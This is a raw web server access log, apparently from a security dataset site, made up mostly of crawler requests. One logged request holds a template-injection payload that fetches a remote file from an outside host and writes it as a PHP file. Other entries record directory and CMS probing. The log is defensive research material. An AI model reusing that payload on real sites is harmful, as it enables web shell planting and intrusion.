51.222.253.20 - - [22/Sep/2024:12:21:01 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.15 - - [22/Sep/2024:12:24:10 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.8 - - [22/Sep/2024:12:27:16 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.6 - - [22/Sep/2024:12:30:37 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
207.46.13.64 - - [22/Sep/2024:12:36:14 -0700] "GET /self.logs/access.log.2023-09-11.gz HTTP/1.1" 200 19438 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.15 - - [22/Sep/2024:12:37:24 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
157.55.39.57 - - [22/Sep/2024:12:41:52 -0700] "GET /self.logs/access.log.2018-05-27.gz HTTP/1.1" 301 487 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
216.244.66.245 - - [22/Sep/2024:12:46:24 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
207.46.13.87 - - [22/Sep/2024:12:46:58 -0700] "GET /self.logs/access.log.2024-08-17.gz HTTP/1.1" 200 17012 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
207.46.13.151 - - [22/Sep/2024:12:51:27 -0700] "GET /self.logs/error.log.2023-10-23.gz HTTP/1.1" 200 2453 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
159.223.99.215 - - [22/Sep/2024:12:52:46 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" 
216.244.66.245 - - [22/Sep/2024:12:54:07 -0700] "GET /self.logs/error.log.2024-01-24.gz HTTP/1.1" 200 1255 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:14 -0700] "GET /self.logs/error.log.2024-02-21.gz HTTP/1.1" 200 2810 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:19 -0700] "GET /self.logs/error.log.2024-02-29.gz HTTP/1.1" 200 2148 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:23 -0700] "GET /self.logs/error.log.2019-06-28.gz HTTP/1.1" 200 2401 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:27 -0700] "GET /self.logs/error.log.2022-03-15.gz HTTP/1.1" 200 929 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:30 -0700] "GET /self.logs/error.log.2022-04-17.gz HTTP/1.1" 200 554 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:34 -0700] "GET /self.logs/error.log.2022-09-25.gz HTTP/1.1" 200 1984 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:37 -0700] "GET /self.logs/error.log.2023-09-08.gz HTTP/1.1" 200 1502 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:38 -0700] "GET /self.logs/error.log.2023-11-03.gz HTTP/1.1" 200 2370 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:44 -0700] "GET /self.logs/error.log.2017-02-27.gz HTTP/1.1" 200 1058 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:46 -0700] "GET /self.logs/error.log.2019-02-06.gz HTTP/1.1" 200 5984 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:47 -0700] "GET /self.logs/error.log.2019-05-19.gz HTTP/1.1" 200 8837 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:48 -0700] "GET /self.logs/error.log.2019-12-01.gz HTTP/1.1" 200 1038 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:54:49 -0700] "GET /self.logs/error.log.2021-08-27.gz HTTP/1.1" 200 1990 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:05 -0700] "GET /self.logs/access.log.2022-08-20.gz HTTP/1.1" 200 17608 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:08 -0700] "GET /self.logs/access.log.2022-09-26.gz HTTP/1.1" 200 17027 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:11 -0700] "GET /self.logs/access.log.2023-04-11.gz HTTP/1.1" 200 15837 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:13 -0700] "GET /self.logs/access.log.2023-04-25.gz HTTP/1.1" 200 22799 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:31 -0700] "GET /self.logs/error.log.2021-08-03.gz HTTP/1.1" 200 4150 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:55:32 -0700] "GET /self.logs/error.log.2021-09-20.gz HTTP/1.1" 200 5308 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:02 -0700] "GET /self.logs/access.log.2022-11-11.gz HTTP/1.1" 200 14732 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:03 -0700] "GET /self.logs/access.log.2023-01-14.gz HTTP/1.1" 200 7995 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:03 -0700] "GET /self.logs/access.log.2023-02-13.gz HTTP/1.1" 200 11285 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:04 -0700] "GET /self.logs/access.log.2023-03-09.gz HTTP/1.1" 200 9836 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:05 -0700] "GET /self.logs/access.log.2023-04-02.gz HTTP/1.1" 200 10162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:12:56:06 -0700] "GET /self.logs/access.log.2023-06-17.gz HTTP/1.1" 200 9924 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
66.249.64.105 - - [22/Sep/2024:13:13:21 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 304 358 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.137 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
51.222.253.10 - - [22/Sep/2024:13:13:31 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
157.55.39.48 - - [22/Sep/2024:13:16:35 -0700] "GET /self.logs/access.log.2022-02-20.gz HTTP/1.1" 200 14476 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
118.107.9.17 - - [22/Sep/2024:13:20:07 -0700] "GET /?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=file_put_contents&t1=b.php&t2=file_get_contents&t3=https://c.krobpra.com/bpcms/1.txt HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
51.222.253.17 - - [22/Sep/2024:13:20:08 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.151.93 - - [22/Sep/2024:13:22:02 -0700] "GET /self.logs/error.log.2020-12-24 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
207.46.13.102 - - [22/Sep/2024:13:22:49 -0700] "GET /self.logs/access.log.2024-06-03.gz HTTP/1.1" 200 91543 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.3 - - [22/Sep/2024:13:23:26 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.7 - - [22/Sep/2024:13:26:51 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.143.233 - - [22/Sep/2024:13:27:03 -0700] "GET /self.logs/error.log.2020-11-09 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.153.152 - - [22/Sep/2024:13:32:02 -0700] "GET /self.logs/error.log.2020-09-05 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
147.229.192.90 - - [22/Sep/2024:13:34:03 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
147.229.192.90 - - [22/Sep/2024:13:34:03 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
147.229.192.90 - - [22/Sep/2024:13:34:04 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
147.229.192.90 - - [22/Sep/2024:13:34:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
147.229.192.90 - - [22/Sep/2024:13:34:04 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
147.229.192.90 - - [22/Sep/2024:13:34:20 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 549157753 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0" 
51.222.253.14 - - [22/Sep/2024:13:37:46 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.2 - - [22/Sep/2024:13:39:59 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [22/Sep/2024:13:40:57 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
157.55.39.12 - - [22/Sep/2024:13:42:41 -0700] "GET /self.logs/access.log.2023-11-06.gz HTTP/1.1" 200 17828 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
157.55.39.56 - - [22/Sep/2024:13:43:03 -0700] "GET /self.logs/error.log.2024-01-08.gz HTTP/1.1" 200 1393 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
114.119.143.233 - - [22/Sep/2024:13:44:48 -0700] "GET /self.logs/error.log.2020-12-13 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
216.244.66.245 - - [22/Sep/2024:13:49:24 -0700] "GET /self.logs/error.log.2023-06-23.gz HTTP/1.1" 200 2589 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:13:49:28 -0700] "GET /self.logs/error.log.2023-07-29.gz HTTP/1.1" 200 1503 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [22/Sep/2024:13:49:32 -0700] "GET /self.logs/error.log.2024-01-25.gz HTTP/1.1" 200 4065 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.15 - - [22/Sep/2024:14:04:32 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /wordpress HTTP/1.1" 301 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /wordpress HTTP/1.1" 429 182 "http://secrepo.com/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD / HTTP/1.1" 301 167 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD / HTTP/1.1" 429 182 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /wp HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /wp HTTP/1.1" 429 182 "http://secrepo.com/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /bc HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /bc HTTP/1.1" 429 182 "http://secrepo.com/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /bk HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /bk HTTP/1.1" 429 182 "http://secrepo.com/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /backup HTTP/1.1" 301 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /backup HTTP/1.1" 429 182 "http://secrepo.com/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /old HTTP/1.1" 301 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:10 -0700] "HEAD /old HTTP/1.1" 429 182 "http://secrepo.com/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /new HTTP/1.1" 301 170 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /new HTTP/1.1" 429 182 "http://secrepo.com/new" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /main HTTP/1.1" 301 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /main HTTP/1.1" 429 182 "http://secrepo.com/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /home HTTP/1.1" 301 171 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:06:11 -0700] "HEAD /home HTTP/1.1" 429 182 "http://secrepo.com/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
51.222.253.5 - - [22/Sep/2024:14:14:15 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.14 - - [22/Sep/2024:14:18:49 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
139.196.39.231 - - [22/Sep/2024:14:19:22 -0700] "GET /plus/img/df_dedetitle.gif HTTP/1.1" 404 328 "http://www.secrepo.com/plus/img/df_dedetitle.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
139.196.39.231 - - [22/Sep/2024:14:19:24 -0700] "GET /include/ckeditor/plugins/smiley/images/angel_smile.gif HTTP/1.1" 404 328 "http://www.secrepo.com/include/ckeditor/plugins/smiley/images/angel_smile.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
139.196.39.231 - - [22/Sep/2024:14:19:25 -0700] "GET /include/ckeditor/images/addon.gif HTTP/1.1" 404 328 "http://www.secrepo.com/include/ckeditor/images/addon.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
139.196.39.231 - - [22/Sep/2024:14:19:26 -0700] "GET /member/templets/images/icon1.gif HTTP/1.1" 404 328 "http://www.secrepo.com/member/templets/images/icon1.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
207.46.13.111 - - [22/Sep/2024:14:21:46 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 53740 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
207.46.13.64 - - [22/Sep/2024:14:22:14 -0700] "GET /self.logs/error.log.2024-09-17.gz HTTP/1.1" 200 1513 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
51.222.253.1 - - [22/Sep/2024:14:22:40 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.143.233 - - [22/Sep/2024:14:24:47 -0700] "GET /self.logs/error.log.2020-12-26 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.16 - - [22/Sep/2024:14:27:10 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
114.119.143.233 - - [22/Sep/2024:14:29:48 -0700] "GET /self.logs/error.log.2020-06-03 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.13 - - [22/Sep/2024:14:31:03 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
42.236.17.116 - - [22/Sep/2024:14:31:34 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
114.119.153.152 - - [22/Sep/2024:14:34:47 -0700] "GET /self.logs/error.log.2019-12-24 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.11 - - [22/Sep/2024:14:35:37 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [22/Sep/2024:14:36:43 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
51.222.253.13 - - [22/Sep/2024:14:37:27 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.11 - - [22/Sep/2024:14:39:42 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
216.128.144.252 - - [22/Sep/2024:14:39:43 -0700] "HEAD /wordpress HTTP/1.1" 301 176 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /wordpress HTTP/1.1" 429 182 "http://secrepo.com/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD / HTTP/1.1" 301 167 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD / HTTP/1.1" 429 182 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /wp HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /wp HTTP/1.1" 429 182 "http://secrepo.com/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
216.128.144.252 - - [22/Sep/2024:14:39:44 -0700] "HEAD /bc HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
